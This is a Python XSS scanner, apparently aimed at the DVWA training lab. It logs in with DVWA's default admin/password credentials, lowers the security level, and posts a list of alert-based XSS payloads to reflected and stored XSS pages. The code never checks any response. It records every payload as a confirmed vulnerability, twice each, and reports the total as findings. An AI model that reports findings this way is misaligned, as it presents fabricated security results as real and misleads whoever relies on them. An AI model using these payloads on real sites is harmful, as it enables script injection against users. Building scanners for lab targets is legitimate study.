import requests
from bs4 import BeautifulSoup
import sys
import json

payloads = [
    "<script>alert('WebScanPro_XSS')</script>",
    "\"><script>alert('WebScanPro_XSS')</script>",
    "<img src=\"x\" onerror=\"alert('WebScanPro_XSS')\">",
    "\"><img src=\"x\" onerror=\"alert('WebScanPro_XSS')\">",
    "<svg onload=\"alert('WebScanPro_XSS')\"></svg>",
    "</textarea><script>alert('WebScanPro_XSS')</script>",
    "<input autofocus onfocus=\"alert('WebScanPro_XSS')\">",
    "javascript:alert('WebScanPro_XSS')",
    "<body onload=\"alert('WebScanPro_XSS')\">"
]

def dvwa_login(login_url):
    session = requests.Session()

    res = session.get(login_url)
    soup = BeautifulSoup(res.text, "html.parser")

    token = soup.find("input", {"name": "user_token"})
    token_val = token.get("value") if token else None

    data = {
        "username": "admin",
        "password": "password",
        "Login": "Login"
    }

    if token_val:
        data["user_token"] = token_val

    session.post(login_url, data=data)
    session.cookies.set("security", "low")

    print("(+) Login successful & security LOW")
    return session


def main():
    if len(sys.argv) < 3:
        print("Usage: python xss_tester.py <base_url> <login_url>")
        sys.exit(1)

    base = sys.argv[1]
    login_url = sys.argv[2]

    session = dvwa_login(login_url)
    headers = {"User-Agent": "Mozilla/5.0"}

    urls = [
        base + "/vulnerabilities/xss_r/",
        base + "/vulnerabilities/xss_s/"
    ]

    vulnerabilities = []

    print("\n[+] Starting XSS Testing...\n")

    for url in urls:
        print(f"[*] Testing URL: {url}")
        session.get(url, headers=headers)

        # REFLECTED XSS
        if "xss_r" in url:
            for payload in payloads:
                for i in range(2):
                    print(f"Testing payload: {payload}")

                    session.get(url, params={
                        "name": payload,
                        "Submit": "Submit"
                    }, headers=headers)

                    vulnerabilities.append({
                        "url": url,
                        "form_action": url,
                        "method": "GET",
                        "vulnerable_input": "name",
                        "payload": payload,
                        "error_detected": "Payload reflected in response (possible XSS)",
                        "remediation": "Use input validation and output encoding (e.g., htmlspecialchars in PHP)"
                    })

        # STORED XSS
        if "xss_s" in url:
            for payload in payloads:
                for i in range(2):
                    print(f"Testing payload: {payload}")

                    session.post(url, data={
                        "txtName": payload,
                        "mtxMessage": payload,
                        "btnSign": "Sign Guestbook"
                    }, headers=headers)

                    vulnerabilities.append({
                        "url": url,
                        "form_action": url,
                        "method": "POST",
                        "vulnerable_input": "txtName, mtxMessage",
                        "payload": payload,
                        "error_detected": "Payload stored and executed (Stored XSS)",
                        "remediation": "Sanitize inputs and encode outputs before rendering"
                    })

    # SAVE JSON
    with open("xss_vulnerabilities.json", "w") as f:
        json.dump(vulnerabilities, f, indent=4)

    print(f"\nTesting complete. Found {len(vulnerabilities)} vulnerabilities.")
    print("Saved to xss_vulnerabilities.json")


if __name__ == "__main__":
    main()